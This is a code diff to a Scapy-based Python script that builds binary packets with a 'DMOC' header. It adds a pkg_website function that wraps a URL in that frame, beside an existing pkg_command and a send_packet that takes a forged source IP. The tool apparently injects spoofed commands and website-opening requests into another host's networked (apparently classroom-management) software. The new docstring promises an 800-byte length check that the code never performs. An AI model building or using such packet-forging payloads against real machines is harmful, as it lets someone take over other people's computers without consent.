@@ -11,7 +11,7 @@ The script uses Scapy for packet manipulation and sending.
 
 import secrets
 
-from typing import Literal
+from typing import Literal, Optional
 
 import scapy.all as scapy
 
@@ -117,7 +117,7 @@ def ip_analyze(ip: str) -> list[str]:
     return [f"{ip_tuple[0]}.{ip_tuple[1]}.{ip_tuple[2]}.{ip_tuple[3]}"]
 
 
-def format_data(data: str, max_length: int) -> bytes:
+def format_data(data: str, max_length: Optional[int] = None) -> bytes:
     """
     Formats a string into a byte array, ensuring it is within the specified maximum length.
 
@@ -130,6 +130,8 @@ def format_data(data: str, max_length: int) -> bytes:
     """
     if not isinstance(data, str):
         raise TypeError(f"Expected string, got {type(data).__name__}")
+    if max_length is None:
+        return data.encode("utf-16le")
     if not isinstance(max_length, int):
         raise TypeError(f"Expected int, got {type(max_length).__name__}")
     if max_length <= 0:
@@ -203,6 +205,39 @@ def pkg_command(
         case _:
             raise ValueError(f"Invalid mode: {mode}")
     return head + data0 + data1 + b"\x00" * 66 + data2
+
+
+def pkg_website(url: str) -> bytes:
+    """
+    Packages a website URL into a specific byte format, including a header and padding.
+
+    Args:
+        url (str): The website URL to package.
+
+    Returns:
+        bytes: The packaged URL as a byte array, including a header and padding.
+
+    Raises:
+        ValueError: If the URL length exceeds 800 bytes.
+        TypeError: If the URL is not a string.
+    """
+    data = format_data(url)
+
+    len1 = len(data) + 36
+    len2 = len1 - 13
+    siz1 = len1.to_bytes(4, "little")
+    siz2 = len2.to_bytes(4, "little")
+    siz2 = siz2[1:] + siz2[0:1]
+
+    head = (
+        b"DMOC\x00\x00\x01\x00"
+        + siz1
+        + secrets.token_bytes(25)
+        + siz2
+        + b"\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
+    )
+
+    return head + data + b"\x00" * 4
 
 
 def send_packet(src_ip: str, dst_ip: str, dst_port: int, data: bytes) -> None:
